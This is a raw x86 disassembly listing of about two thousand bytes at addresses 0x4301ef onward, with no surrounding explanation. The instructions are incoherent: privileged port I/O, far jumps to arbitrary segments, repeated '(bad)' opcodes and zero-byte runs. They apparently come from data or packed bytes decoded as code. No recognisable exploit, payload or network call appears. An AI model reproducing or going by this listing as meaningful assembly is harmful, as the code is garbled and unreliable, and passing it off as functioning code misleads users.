  4301ef:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4301f1:	into   
  4301f2:	test   eax,0x0
  4301f7:	add    cl,bl
  4301f9:	cld    
  4301fa:	aas    
  4301fb:	mov    esp,0xe17860e1
  430200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430201:	iret   
  430202:	xchg   edi,eax
  430203:	adc    eax,ecx
  430205:	pusha  
  430206:	xchg   edi,eax
  430207:	sbb    BYTE PTR [ebx-0x5a],bl
  43020a:	outs   dx,BYTE PTR ds:[esi]
  43020b:	add    BYTE PTR [edi-0x1375140f],dh
  430211:	in     eax,0xfd
  430213:	aas    
  430214:	mov    ecx,0x3f39d584
  430219:	mov    eax,ds:0xa8b74699
  43021e:	push   edx
  43021f:	sar    DWORD PTR [edx],0x71
  430222:	add    ebp,DWORD PTR [edx-0x5b]
  430225:	loope  0x4301c1
  430227:	inc    edi
  430228:	mov    cl,0xe1
  43022a:	call   0x53b62d02
  43022f:	xor    edi,DWORD PTR [ecx]
  430231:	xor    al,0xd0
  430233:	sbb    bh,dl
  430235:	jg     0x43026f
  430237:	lgs    eax,FWORD PTR [esi+0x18]
  43023b:	mov    bh,0x67
  43023d:	jmp    0x34837695
  430242:	hlt    
  430243:	adc    eax,0x1071f084
  430248:	mov    esp,0xdc5013f3
  43024d:	lock das 
  43024f:	push   eax
  430250:	into   
  430251:	fs ins DWORD PTR es:[edi],dx
  430253:	mov    ebp,DWORD PTR [edi-0x4c]
  430256:	pop    ss
  430257:	mov    dh,0x77
  430259:	mov    ch,0x70
  43025b:	rol    DWORD PTR [eax],0x0
  43025e:	add    BYTE PTR [eax],al
  430260:	add    al,cl
  430262:	test   eax,0xd33dc46b
  430267:	adc    al,0xc8
  430269:	push   edi
  43026a:	cs pop ecx
  43026c:	xor    al,0xd2
  43026e:	xchg   edi,eax
  43026f:	je     0x430275
  430271:	pushf  
  430272:	repz (bad) 
  430275:	jl     0x430267
  430277:	pop    es
  430278:	push   eax
  430279:	mov    esi,0x1f8b6d64
  43027e:	mov    bh,0x17
  430280:	mov    dh,0x27
  430282:	mov    ah,0x70
  430284:	rcr    DWORD PTR [eax-0x6f3b9457],0xd7
  43028b:	in     eax,dx
  43028c:	push   es
  43028d:	enter  0x9b34,0x4a
  430291:	mov    al,0x14
  430293:	(bad)  
  430294:	pop    esp
  430295:	imul   ecx,DWORD PTR [eax+0x33382bf9],0xb
  43029c:	inc    esp
  43029d:	nop
  43029e:	mov    bl,0x84
  4302a0:	inc    ebp
  4302a1:	xchg   ecx,eax
  4302a2:	retf   
  4302a3:	call   0x8df1:0x6e6619f0
  4302aa:	xor    edx,DWORD PTR [ebp-0x3356fbd]
  4302b0:	xor    dl,bh
  4302b2:	jb     0x430248
  4302b4:	inc    ebx
  4302b5:	nop
  4302b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302b7:	gs adc al,0x80
  4302ba:	fmul   st,st(7)
  4302bc:	dec    DWORD PTR [ecx]
  4302be:	out    dx,eax
  4302bf:	mov    bh,0x7d
  4302c1:	int3   
  4302c2:	leave  
  4302c3:	pop    ebp
  4302c4:	mov    esi,0x0
  4302c9:	add    BYTE PTR [ecx+0x62e807a6],dl
  4302cf:	enter  0xfa66,0x14
  4302d3:	or     bl,bh
  4302d5:	(bad)  
  4302d7:	out    dx,eax
  4302d8:	mov    bl,0x7d
  4302da:	aam    0xc9
  4302dc:	jo     0x1cdace3d
  4302e2:	call   0xdf42d12e
  4302e7:	push   esp
  4302e8:	sbb    ebp,eax
  4302ea:	or     BYTE PTR [ecx],0x10
  4302ed:	jg     0x43029c
  4302ef:	adc    cl,BYTE PTR gs:[ebp-0x183d6a2b]
  4302f6:	popf   
  4302f7:	ficom  DWORD PTR [eax]
  4302f9:	add    BYTE PTR ds:0x74f2c17,bl
  4302ff:	call   DWORD PTR [edi]
  430301:	call   0x53d37f
  430306:	or     DWORD PTR [ebx+0x7f9c6cfb],esi
  43030c:	xor    eax,0x9b2826c4
  430311:	imul   edx,DWORD PTR [esi],0x46
  430314:	adc    DWORD PTR [ebp-0x38874d4f],eax
  43031a:	retf   
  43031b:	mov    ebx,0xb48843a8
  430320:	hlt    
  430321:	mov    ?,edi
  430323:	retf   0xcd8c
  430326:	nop
  430327:	mov    dl,0xb7
  430329:	jmp    FWORD PTR [edi+0xebf949]
  43032f:	add    BYTE PTR [eax],al
  430331:	add    BYTE PTR [eax],al
  430333:	(bad)  
  430334:	cdq    
  430335:	cmp    DWORD PTR [eax+ebp*4],eax
  430338:	mov    ch,0x2f
  43033a:	add    edx,DWORD PTR [eax+0xe602329]
  430340:	push   esi
  430341:	test   eax,0xcd818b03
  430346:	pushf  
  430347:	xchg   esi,eax
  430348:	mov    cl,0xf5
  43034a:	ins    BYTE PTR es:[edi],dx
  43034b:	xchg   edx,eax
  43034c:	jg     0x430303
  43034e:	ret    
  43034f:	cs daa 
  430351:	adc    ebp,DWORD PTR [esi+eiz*8+0x6d]
  430355:	cmp    DWORD PTR [eax+0x16],0x77849175
  43035c:	mov    dl,0x7d
  43035e:	sbb    eax,0x44f5b1d6
  430363:	lods   eax,DWORD PTR ds:[esi]
  430364:	scas   al,BYTE PTR es:[edi]
  430365:	or     eax,0xf57698dc
  43036a:	imul   eax,DWORD PTR [ebp+0x69],0xfffffff6
  43036e:	add    ebp,DWORD PTR [edi+0x2b034955]
  430374:	or     DWORD PTR [ebp+0x2c],0x6cf5b190
  43037b:	lea    edi,[edi+0x35]
  43037e:	ret    
  43037f:	dec    esi
  430380:	daa    
  430381:	shr    DWORD PTR [ebx+0x6d],cl
  430384:	sbb    cl,BYTE PTR [edi]
  430386:	xchg   ecx,eax
  430387:	or     dh,BYTE PTR [esi-0xe]
  43038a:	push   0xffffffce
  43038c:	mov    dh,0xeb
  43038e:	adc    DWORD PTR [ebp+0x6a],edi
  430391:	or     eax,0x1a554ce9
  430396:	add    DWORD PTR [eax],0x0
  43039c:	retf   
  43039d:	cdq    
  43039e:	push   edx
  43039f:	jmp    0xe899210f
  4303a4:	xchg   ebx,eax
  4303a5:	cmp    esi,DWORD PTR [ecx-0x3]
  4303a8:	xchg   edx,eax
  4303a9:	mov    bh,0x1d
  4303ab:	add    DWORD PTR [edx+edi*4-0x4adb16f2],ebp
  4303b2:	pop    ds
  4303b3:	test   eax,0x4497fbd4
  4303b8:	xor    al,0x55
  4303ba:	xchg   BYTE PTR [ecx],dh
  4303bc:	or     eax,0xc96af276
  4303c1:	mov    dh,0xeb
  4303c3:	ror    DWORD PTR [edx+0x6b],1
  4303c6:	or     eax,0x7a4fd2e9
  4303cb:	inc    ecx
  4303cc:	mov    esp,0xebe9529b
  4303d1:	inc    edi
  4303d2:	push   ebp
  4303d3:	call   0x71278d6b
  4303d8:	popa   
  4303d9:	mov    esi,0x644e3f44
  4303de:	inc    esp
  4303df:	aaa    
  4303e0:	or     DWORD PTR [edi-0x6e],ebp
  4303e3:	sbb    edi,eax
  4303e5:	xor    dh,0x59
  4303e8:	mov    edi,0x5160ebb9
  4303ed:	fimul  DWORD PTR [edi-0x84347e4]
  4303f3:	cli    
  4303f4:	(bad)
  4303f9:	dec    edi
  4303fa:	test   bl,0xfb
  4303fd:	popa   
  4303fe:	xchg   ebp,eax
  4303ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430400:	add    BYTE PTR [eax],al
  430402:	add    BYTE PTR [eax],al
  430404:	add    BYTE PTR [ebx+0x55005938],dh
  43040a:	inc    ecx
  43040b:	cmp    al,0xf6
  43040d:	ins    BYTE PTR es:[edi],dx
  43040e:	outs   dx,BYTE PTR ds:[esi]
  43040f:	sbb    BYTE PTR [ebp+0xeae62],al
  430415:	jb     0x4303d2
  430417:	adc    eax,DWORD PTR [ebp-0x716d4e4a]
  43041d:	stc    
  43041e:	mov    ch,0xe
  430420:	push   0xffffffc1
  430422:	out    0x40,eax
  430424:	(bad)  
  430425:	(bad)  
  430427:	std    
  430428:	aas    
  430429:	mov    ecx,0xf0cd034
  43042e:	sub    eax,0x270f8453
  430433:	adc    DWORD PTR [esi+0x32],esp
  430436:	repz xchg ebx,eax
  430438:	data16 and al,bh
  43043b:	jmp    0x983526a5
  430440:	data16 xor al,bh
  430443:	pcmpgtd mm6,QWORD PTR [edx]
  430446:	repnz fwait
  430448:	data16 add cl,bh
  43044b:	or     eax,0x9716ac8b
  430450:	inc    edi
  430451:	jno    0x43047f
  430453:	push   ebx
  430454:	pushf  
  430455:	lock clc 
  430457:	sbb    ecx,DWORD PTR [ebx+0x47970ebc]
  43045d:	pop    ebp
  43045e:	sub    al,0x53
  430460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430461:	lock clc 
  430463:	add    ecx,DWORD PTR [ebx+0x479706ac]
  430469:	add    BYTE PTR [eax],al
  43046b:	add    BYTE PTR [eax],al
  43046d:	add    BYTE PTR ds:0xd54594d7,dh
  430473:	xlat   BYTE PTR ds:[ebx]
  430474:	xchg   esi,eax
  430475:	inc    edi
  430476:	dec    ecx
  430477:	xlat   BYTE PTR ds:[ebx]
  430478:	xchg   esp,eax
  430479:	inc    ebp
  43047a:	jns    0x430453
  43047c:	xchg   esi,eax
  43047d:	inc    edi
  43047e:	fcom   DWORD PTR [ebp+eax*2+0x4796d6fd]
  430486:	nop
  430487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430488:	int3   
  430489:	xchg   ch,cl
  43048b:	and    ecx,edx
  43048d:	mov    BYTE PTR [edi-0x57],dl
  430490:	int3   
  430491:	xchg   BYTE PTR [ebp+0x37],cl
  430494:	leave  
  430495:	mov    BYTE PTR [edi-0x4d],dl
  430498:	xchg   edi,eax
  430499:	inc    esp
  43049a:	rcl    BYTE PTR [ecx-0x54],1
  43049d:	sub    ebx,DWORD PTR [ebx]
  43049f:	(bad)  
  4304a0:	fwait
  4304a1:	test   cl,bl
  4304a3:	push   ds
  4304a4:	adc    eax,0xbfdb578d
  4304a9:	push   eax
  4304aa:	shl    DWORD PTR [ecx-0x2a30af01],1
  4304b0:	lahf   
  4304b1:	or     eax,0xc020cb50
  4304b6:	test   al,0x9b
  4304b8:	xlat   BYTE PTR ds:[ebx]
  4304b9:	add    BYTE PTR [eax+0x3a00038d],dl
  4304bf:	mov    edi,0x8f8927f7
  4304c4:	adc    ch,al
  4304c6:	or     DWORD PTR [ebx+0x6e13000f],edx
  4304cc:	data16 (bad) 
  4304ce:	stc    
  4304cf:	leave  
  4304d0:	bound  esi,QWORD PTR [eax]
  4304d2:	add    BYTE PTR [eax],al
  4304d4:	add    BYTE PTR [eax],al
  4304d6:	add    BYTE PTR [eax+0xa],bh
  4304d9:	pop    ss
  4304da:	add    DWORD PTR [eax+0x502f18f4],edx
  4304e0:	mov    cl,BYTE PTR [ebp-0x7a]
  4304e3:	cmc    
  4304e4:	and    ecx,edi
  4304e6:	xchg   edi,eax
  4304e7:	enter  0xab42,0xe3
  4304eb:	adc    ecx,DWORD PTR [edi+0x4968fa66]
  4304f1:	fiadd  DWORD PTR [eax]
  4304f3:	nop
  4304f4:	or     ecx,DWORD PTR [edi]
  4304f6:	add    BYTE PTR [edx-0x66e8083b],bh
  4304fc:	test   DWORD PTR [edx],edx
  4304fe:	call   0x5296e0
  430503:	adc    esi,DWORD PTR [ebx-0x46d88826]
  430509:	push   es
  43050a:	ins    BYTE PTR es:[edi],dx
  43050b:	stc    
  43050c:	scas   al,BYTE PTR es:[edi]
  43050d:	test   BYTE PTR [ebx],0x2f
  430510:	lods   eax,DWORD PTR ds:[esi]
  430511:	or     BYTE PTR [edi+ecx*8-0xd],al
  430515:	pusha  
  430516:	fucomip st,st(7)
  430518:	dec    esp
  430519:	ins    DWORD PTR es:[edi],dx
  43051a:	fmul   QWORD PTR [eax]
  43051c:	outs   dx,BYTE PTR ds:[esi]
  43051d:	pop    ecx
  43051e:	add    DWORD PTR [esi+esi*4+0x3c],0xf66a7c6c
  430526:	add    esp,DWORD PTR [edi]
  430528:	dec    ebp
  430529:	stc    
  43052a:	jmp    0x430513
  43052c:	call   0x2ad:0x8de803b9
  430533:	nop
  430534:	sub    ebx,0xffffff8a
  430537:	cmp    al,0xb6
  430539:	in     al,dx
  43053a:	out    dx,al
  43053b:	add    BYTE PTR [eax],al
  43053d:	add    BYTE PTR [eax],al
  43053f:	add    BYTE PTR [ebx-0x44f49549],cl
  430545:	or     DWORD PTR ds:0xf5b1904d,0xf43ae77e
  43054f:	mov    BYTE PTR [edx+eiz*4+0x6e],cl
  430553:	add    ch,BYTE PTR [edi+0x767370a8]
  430559:	lods   al,BYTE PTR ds:[esi]
  43055a:	call   0x6136cca2
  43055f:	fidiv  WORD PTR [edi+0x4c]
  430562:	cmp    eax,0xd13d08d5
  430567:	sbb    ah,0xb6
  43056a:	mov    ah,0x88
  43056c:	push   ecx
  43056d:	retf   0xcbd4
  430570:	nop
  430571:	mov    dl,0xb7
  430573:	pop    es
  430574:	nop
  430575:	pop    ebp
  430576:	jo     0x4305df
  430578:	adc    dh,al
  43057a:	fld    QWORD PTR [edx]
  43057c:	nop
  43057d:	mov    dl,0xfc
  43057f:	lods   al,BYTE PTR ds:[esi]
  430580:	in     al,0xaa
  430582:	push   cs
  430583:	(bad)  
  430584:	mul    BYTE PTR [esi-0x507c7633]
  43058a:	mov    esi,0x42299272
  43058f:	icebp  
  430590:	or     BYTE PTR [edi+0xa],dh
  430593:	sub    BYTE PTR [ebx-0x6c6e851],dh
  430599:	mov    dl,0x99
  43059b:	lods   al,BYTE PTR ds:[esi]
  43059c:	fwait
  43059d:	bound  ebx,QWORD PTR [ecx-0x14468494]
  4305a3:	add    BYTE PTR ss:[eax],al
  4305a6:	add    BYTE PTR [eax],al
  4305a8:	add    BYTE PTR [edx],cl
  4305aa:	pop    esi
  4305ab:	push   ss
  4305ac:	outs   dx,BYTE PTR es:[esi]
  4305ae:	mov    edi,0xb25c26ec
  4305b3:	push   cs
  4305b4:	jmp    0x637ad04c
  4305b9:	pop    esp
  4305ba:	mov    esp,0xb94b5c99
  4305bf:	jmp    0x4305c7
  4305c1:	cmp    al,0x3e
  4305c3:	add    bh,dh
  4305c5:	lods   eax,DWORD PTR ds:[esi]
  4305c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4305c7:	jmp    0x430645
  4305c9:	(bad)
  4305cd:	and    al,0xbc
  4305cf:	aad    0xab
  4305d1:	jl     0x430585
  4305d3:	inc    ecx
  4305d4:	jb     0x430606
  4305d6:	cmp    dl,dh
  4305d8:	sar    DWORD PTR [ebp-0x6c1e96c9],1
  4305de:	gs inc esp
  4305e0:	push   ds
  4305e1:	pop    es
  4305e2:	(bad)  [edx+0x1d]
  4305e5:	(bad)  
  4305e6:	add    ch,BYTE PTR ds:[eax+0x2]
  4305ea:	imul   bl
  4305ec:	dec    esi
  4305ed:	xchg   esp,eax
  4305ee:	inc    ecx
  4305ef:	cmp    eax,0x45278f72
  4305f4:	stc    
  4305f5:	fidiv  WORD PTR [ebp+0x2]
  4305f8:	jmp    0xb8c3:0x57a5cdc3
  4305ff:	xchg   edx,eax
  430600:	add    cl,bh
  430602:	mov    edx,0x352a8b25
  430607:	arpl   WORD PTR [edx+ebp*1],dx
  43060a:	dec    edx
  43060b:	call   0x0:0x47
  430612:	dec    ecx
  430613:	aaa    
  430614:	pusha  
  430615:	or     BYTE PTR [eax+edi*1-0x2426f0a1],dh
  43061c:	call   0xd4781f96
  430621:	jmp    esp
  430623:	mov    ecx,0x414e58f3
  430628:	call   0x96fd3ab8
  43062d:	pop    es
  43062e:	jb     0x430619
  430630:	adc    eax,edi
  430632:	ss scas al,BYTE PTR es:[edi]
  430634:	push   cs
  430635:	add    bl,bh
  430637:	mov    cl,0x95
  430639:	ja     0x430628
  43063b:	xor    al,0x14
  43063d:	sub    DWORD PTR [ecx-0x3abef262],0x1
  430644:	por    mm7,QWORD PTR [ebx+0x1f5fce7f]
  43064b:	in     eax,0x94
  43064d:	in     eax,0x1c
  43064f:	jo     0x43066c
  430651:	add    BYTE PTR [esi*1-0x4a427c09],al
  430658:	pop    esp
  430659:	push   esi
  43065a:	mov    esi,0xb88b1bba
  43065f:	jl     0x430624
  430661:	lea    ebp,[edx+edi*1+0x36455d96]
  430668:	dec    edx
  430669:	cld    
  43066a:	popa   
  43066b:	rcr    BYTE PTR [ebx],1
  43066d:	(bad)  
  43066e:	ds sub eax,0x404a74ac
  430674:	(bad)  
  430675:	cld    
  430676:	add    BYTE PTR [eax],al
  430678:	add    BYTE PTR [eax],al
  43067a:	add    BYTE PTR [esi],ch
  43067c:	mov    edx,0xb9fe51df
  430681:	adc    ecx,DWORD PTR [ebx+0x54480d90]
  430687:	dec    edi
  430688:	and    al,0x61
  43068a:	test   DWORD PTR [eax+0x40],ebp
  43068d:	into   
  43068e:	repz sub BYTE PTR [eax],ah
  430691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430692:	cli    
  430693:	aaa    
  430694:	popf   
  430695:	ins    BYTE PTR es:[edi],dx
  430696:	mov    esi,0xb5212cb
  43069b:	nop
  43069c:	inc    eax
  43069d:	ret    
  43069e:	and    edx,DWORD PTR [esi+ecx*2+0x50817441]
  4306a5:	adc    bh,BYTE PTR [edi-0x78]
  4306a8:	mov    edi,0xb88c6ecf
  4306ad:	dec    edi
  4306ae:	out    0xaa,al
  4306b0:	dec    eax
  4306b1:	dec    edi
  4306b2:	das    
  4306b3:	jmp    0x430687
  4306b5:	ins    BYTE PTR es:[edi],dx
  4306b6:	cmp    eax,0xf4f4898
  4306bb:	xchg   ebx,eax
  4306bc:	mov    DWORD PTR [eax+ecx*1+0xb],ebp
  4306c0:	jnp    0x4306ce
  4306c2:	sar    DWORD PTR [esi],1
  4306c4:	push   eax
  4306c5:	loop   0x4306da
  4306c7:	adc    ecx,DWORD PTR [ecx+0x33de36ff]
  4306cd:	jmp    0x7bc6:0x14c34886
  4306d4:	(bad)  
  4306d5:	in     eax,0xfd
  4306d7:	bound  ecx,QWORD PTR [ebx-0x34734243]
  4306dd:	lds    edx,FWORD PTR [edx+0x0]
  4306e0:	add    BYTE PTR [eax],al
  4306e2:	add    BYTE PTR [eax],al
  4306e4:	sub    cl,bl
  4306e6:	push   0xfffffff0
  4306e8:	test   al,0x16
  4306ea:	pop    esi
  4306eb:	cli    
  4306ec:	(bad)  
  4306ed:	push   ecx
  4306ee:	inc    edx
  4306ef:	test   BYTE PTR [edx+0x76],ah
  4306f2:	ss xchg esp,edi
  4306f5:	lods   eax,DWORD PTR ds:[esi]
  4306f6:	push   cs
  4306f7:	cmp    DWORD PTR [edx-0x2d78ef8a],edi
  4306fd:	int    0x34
  4306ff:	add    BYTE PTR [eax-0x670c0a4e],dl
  430705:	outs   dx,BYTE PTR ds:[esi]
  430706:	rcl    DWORD PTR [ebx],1
  430708:	fcomp  QWORD PTR [ebp-0x34a682d9]
  43070e:	gs jno 0x43075b
  430711:	mov    ah,0x60
  430713:	push   esp
  430714:	adc    al,0xe1
  430716:	loop   0x43077b
  430718:	data16 repnz add al,0xd2
  43071c:	in     eax,dx
  43071d:	stos   BYTE PTR es:[edi],al
  43071e:	cmc    
  43071f:	jl     0x430706
  430721:	(bad)  
  430722:	dec    esp
  430723:	rol    eax,cl
  430725:	pop    edi
  430726:	mov    ds:0xc227c2d9,al
  43072b:	daa    
  43072c:	lods   al,BYTE PTR ds:[esi]
  43072d:	daa    
  43072e:	dec    edi
  43072f:	jge    0x43078b
  430731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430732:	pop    esi
  430733:	loopne 0x4306e8
  430735:	sahf   
  430736:	jb     0x430773
  430738:	add    DWORD PTR [edi+0x78],0x43
  43073c:	in     eax,dx
  43073d:	retf   
  43073e:	jmp    0x60f6f1fc
  430743:	dec    esp
  430744:	adc    al,0xd8
  430746:	or     esi,0x0
  43074c:	add    cl,ah
  43074e:	imul   edi,ecx,0x2
  430751:	sbb    eax,0x4cf7e53c
  430756:	daa    
  430757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430758:	sti    
  430759:	mov    bh,0x9d
  43075b:	and    esi,DWORD PTR [ecx-0x46]
  43075e:	daa    
  43075f:	push   cs
  430760:	xchg   DWORD PTR [esi+edi*1-0x71a48344],edi
  430767:	jmp    0xdd7ea242
  43076c:	fstp   DWORD PTR [edx-0x75ee3285]
  430772:	mov    bl,0xdc
  430774:	jl     0x430748
  430776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430777:	pop    esi
  430778:	(bad)  
  430779:	mov    bl,0x96
  43077b:	jp     0x430744
  43077d:	mov    bl,0x96
  43077f:	push   cs
  430780:	sbb    DWORD PTR [ebp-0x48],eax
  430783:	arpl   cx,sp
  430785:	in     al,0xde
  430787:	not    BYTE PTR [ebx-0x20]
  43078a:	mov    ecx,0x2c9672eb
  43078f:	fild   WORD PTR [ecx-0x71140137]
  430795:	or     al,0xb9
  430797:	or     eax,0x34cc3dfc
  43079c:	jb     0x4307e6
  43079e:	stos   DWORD PTR es:[edi],eax
  43079f:	and    eax,0x3e902e
  4307a4:	bound  esp,QWORD PTR [ebx+ecx*8-0x12]
  4307a8:	pushf  
  4307a9:	mov    al,ds:0x40291fb8
  4307ae:	pop    ecx
  4307af:	dec    ecx
  4307b0:	mov    dl,0x0
  4307b2:	add    BYTE PTR [eax],al
  4307b4:	add    BYTE PTR [eax],al
  4307b6:	ficomp DWORD PTR [ecx-0x30]
  4307b9:	in     eax,0x93
  4307bb:	arpl   WORD PTR [esi],di
  4307bd:	lahf   
  4307be:	add    BYTE PTR [eax-0x1da4d369],0xe9
  4307c5:	ss pusha 
  4307c7:	sub    al,0x54
  4307c9:	fstp   QWORD PTR [ecx-0x51]
  4307cc:	psubsw mm3,QWORD PTR [eax+esi*2+0x1a]
  4307d1:	daa    
  4307d2:	iret   
  4307d3:	mov    bl,0xe
  4307d5:	jmp    0x323afc26
  4307da:	loop   0x43083f
  4307dc:	inc    esp
  4307dd:	sahf   
  4307de:	inc    eax
  4307df:	aas    
  4307e0:	xor    ah,cl
  4307e2:	xor    al,0xda
  4307e4:	jmp    0x430863
  4307e6:	ja     0x430782
  4307e8:	pop    ds
  4307e9:	test   DWORD PTR [edx-0x48],0x2c2fe6ec
  4307f0:	out    0x64,eax
  4307f2:	daa    
  4307f3:	aas    
  4307f4:	pop    es
  4307f5:	or     edi,DWORD PTR ds:[ecx-0xa]
  4307f9:	sbb    bh,dh
  4307fb:	lods   al,BYTE PTR ds:[esi]
  4307fc:	jmp    0x4307fe
  4307fe:	add    ah,BYTE PTR [edi]
  430800:	xchg   ebx,eax
  430801:	idiv   BYTE PTR [ebp-0x62ab6c4d]
  430807:	ret    0xd291
  43080a:	popf   
  43080b:	mov    ebx,0x2f654f93
  430810:	adc    bl,BYTE PTR [edi-0x1e]
  430813:	clc    
  430814:	inc    ebp
  430815:	pop    ebx
  430816:	xor    ah,0x17
  430819:	add    BYTE PTR [eax],al
  43081b:	add    BYTE PTR [eax],al
  43081d:	add    BYTE PTR [eax],al
  43081f:	mov    eax,0x29011c12
  430824:	mov    dh,0x5b
  430826:	push   ebp
  430827:	lahf   
  430828:	in     eax,0xf9
  43082a:	idiv   BYTE PTR [ebp+0x39012eda]
  430830:	mov    dh,0xd
  430832:	push   edi
  430833:	mov    ds:0xdc7b5fff,al
  430838:	or     al,0x7b
  43083a:	cmp    DWORD PTR [edi-0x28749056],edx
  430840:	mov    ecx,0xb5e9c7df
  430845:	sbb    al,BYTE PTR [eax]
  430847:	cmp    al,0x7f
  430849:	mov    fs,edi
  43084b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43084c:	and    esp,edi
  43084e:	push   DWORD PTR [eax-0x60]
  430851:	jno    0x51bee5
  430857:	stc    
  430858:	xchg   esp,esi
  43085a:	push   ds
  43085b:	xor    ch,BYTE PTR [esp-0x6c36e3f2]
  430862:	inc    edx
  430863:	lods   eax,DWORD PTR ds:[esi]
  430864:	fimul  DWORD PTR [esi]
  430866:	add    BYTE PTR [ecx+0x2cc724a5],ch
  43086c:	lods   al,BYTE PTR ds:[esi]
  43086d:	loopne 0x4308b1
  43086f:	lods   eax,DWORD PTR ds:[esi]
  430870:	mov    ch,0xe
  430872:	push   cs
  430873:	test   eax,0x838919aa
  430878:	test   BYTE PTR [ebx+ecx*8-0x5df8c70],dl
  43087f:	xchg   DWORD PTR [eax+0xcf68],eax
  430885:	add    BYTE PTR [eax],al
  430887:	add    BYTE PTR ds:0x6bd4e64d,dl
  43088d:	(bad)
  430891:	fst    QWORD PTR [esi]
  430893:	test   eax,0xffe79b90
  430898:	jecxz  0x430839
  43089a:	push   0x25
  43089c:	imul   ebx,DWORD PTR [edi+0x4b4ffb36],0x7c
  4308a3:	mov    dl,dl
  4308a5:	xchg   edi,eax
  4308a6:	dec    eax
  4308a7:	std    
  4308a8:	or     BYTE PTR [ecx+0x434b86c1],cl
  4308ae:	adc    al,0xfa
  4308b0:	das    
  4308b1:	sub    BYTE PTR [ecx-0x11],ch
  4308b4:	or     eax,0xaa87e729
  4308b9:	iret   
  4308ba:	enter  0x1707,0xc6
  4308be:	or     bh,BYTE PTR [edi+0x54]
  4308c1:	fwait
  4308c2:	jl     0x4308d8
  4308c4:	mov    BYTE PTR [ebp-0x14f50031],ch
  4308ca:	push   0x73
  4308cc:	lods   al,BYTE PTR ds:[esi]
  4308cd:	xchg   DWORD PTR [esi+0xf1f9ff1],edx
  4308d3:	add    DWORD PTR [eax-0x7bbeab65],edx
  4308d9:	mov    ecx,DWORD PTR [edi]
  4308db:	add    BYTE PTR [eax+0x1b551124],dl
  4308e1:	pop    ebx
  4308e2:	pop    ss
  4308e3:	mov    DWORD PTR [esi-0x5d],ecx
  4308e6:	push   0x1b5b0afe
  4308eb:	mov    DWORD PTR [eax],eax
  4308ed:	add    BYTE PTR [eax],al
  4308ef:	add    BYTE PTR [eax],al
  4308f1:	dec    esi
  4308f2:	(bad)
  4308f6:	js     0x4308db
  4308f8:	push   ebp
  4308f9:	sbb    esi,DWORD PTR [eax]
  4308fb:	call   0xe9f54f86
  430900:	or     ah,0xc1
  430903:	clc    
  430904:	push   esi
  430905:	sbb    al,0xff
  430907:	sbb    DWORD PTR [eax],ebx
  430909:	js     0x430895
  43090b:	mov    BYTE PTR [ebp+0x7a],ch
  43090e:	cmp    al,0x29
  430910:	sub    BYTE PTR [esi+esi*1+0x7b13fdb5],bl
  430917:	cmc    
  430918:	add    edx,DWORD PTR [eax+0x17180b3b]
  43091e:	mov    eax,0xb2083df8
  430923:	pusha  
  430924:	lds    edx,FWORD PTR [ebx+0xf083639]
  43092a:	clc    
  43092b:	in     eax,dx
  43092c:	jp     0x4308fe
  43092e:	mov    edx,0xb28feb78
  430933:	pusha  
  430934:	lds    ebx,FWORD PTR [ebx-0x5dffc9c7]
  43093a:	(bad)  
  43093b:	jl     0x430930
  43093d:	xchg   edi,eax
  43093e:	cmp    eax,0x3dc013bc
  430943:	mov    dh,0x13
  430945:	pusha  
  430946:	scas   eax,DWORD PTR es:[edi]
  430947:	jmp    0xd380:0xf5f2a1cf
  43094e:	mov    esi,0xe3a3ddf6
  430953:	pop    edx
  430954:	aad    0x0
  430956:	add    BYTE PTR [eax],al
  430958:	add    BYTE PTR [eax],al
  43095a:	push   ss
  43095b:	jl     0x4309aa
  43095d:	loope  0x430943
  43095f:	scas   eax,DWORD PTR es:[edi]
  430960:	cmp    al,0x79
  430962:	out    0x35,eax
  430964:	xor    al,0xf7
  430966:	add    edi,DWORD PTR [ebx+esi*4]
  430969:	pop    ss
  43096a:	lea    esi,[edx+0x28c7a3f5]
  430970:	test   BYTE PTR [eax+0x7e8582ff],al
  430976:	push   ecx
  430977:	loop   0x4308fe
  430979:	jle    0x4309bc
  43097b:	ror    BYTE PTR [esi],cl
  43097d:	mov    edx,0x741f976a
  430982:	sub    eax,0x9fa992ac
  430987:	(bad)  
  430989:	xor    al,0x6a
  43098b:	ret    
  43098c:	dec    eax
  43098d:	(bad)  
  43098e:	lds    edx,FWORD PTR [edi-0x5312af61]
  430994:	pop    DWORD PTR [ebp-0x16f22551]
  43099a:	xchg   ebx,eax
  43099b:	mov    dl,0x97
  43099d:	aaa    
  43099e:	mov    BYTE PTR [esi],ah
  4309a0:	sub    DWORD PTR [esi-0x12f92ca9],esp
  4309a6:	xchg   ebx,eax
  4309a7:	mov    dl,0xe
  4309a9:	fs mov esp,0x5e3e1823
  4309af:	ds pop edx
  4309b1:	lds    esi,FWORD PTR [ebx-0x66]
  4309b4:	jge    0x430a25
  4309b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309b7:	lods   al,BYTE PTR ds:[esi]
  4309b8:	jmp    0x4309ef
  4309ba:	ja     0x430996
  4309bc:	or     eax,0xe9
  4309c1:	add    BYTE PTR [eax],al
  4309c3:	xchg   ebx,eax
  4309c4:	cmp    eax,0x398fc55a
  4309c9:	jp     0x4309d8
  4309cb:	sbb    BYTE PTR [edx-0x538398f7],0x91
  4309d2:	push   esi
  4309d3:	push   DWORD PTR [edi-0x48148bd]
  4309d9:	xor    cl,BYTE PTR [ecx]
  4309db:	push   esp
  4309dc:	sbb    DWORD PTR [ebp-0x65c783c2],edx
  4309e2:	or     eax,0xe90eb1b0
  4309e7:	pop    eax
  4309e8:	je     0x43097f
  4309ea:	fdivr  DWORD PTR [eax]
  4309ec:	mov    edx,0x6a6b2f97
  4309f1:	lahf   
  4309f2:	push   ss
  4309f3:	xor    al,0xe0
  4309f5:	into   
  4309f6:	scas   al,BYTE PTR es:[edi]
  4309f7:	int    0xd
  4309f9:	dec    eax
